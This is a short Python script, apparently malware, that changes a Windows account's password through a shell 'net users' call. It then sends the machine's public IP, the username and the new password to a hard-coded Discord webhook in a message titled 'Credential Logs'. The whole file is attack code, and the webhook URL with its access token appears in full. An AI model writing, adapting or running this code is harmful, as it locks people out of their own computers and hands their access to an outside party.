import os
from time import sleep
from discord_webhook import DiscordWebhook, DiscordEmbed
from requests import get
import socket
import subprocess

ip = get('https://api.ipify.org').text
user = socket.gethostname()
passw = "pass@-2word" # Must include symbol and character length must more than 6
subprocess.call("net users "+user+" "+passw, shell = True)

# Webhook
webhook = DiscordWebhook(url='https://discord.com/api/webhooks/940655320437497906/0bEsbcl_jMK6WZLnIbIoUmQ4k81Pizt2SId6s5ECKXZpaYfyWzPkRTDwyAl01KoWx4hQ')
embed = DiscordEmbed(title='Credential Logs', description=f'```\nIP Address : {ip}\nUsername : {user}\nPassword : {passw}\n```', color='03b2f8')
webhook.add_embed(embed)
response = webhook.execute()
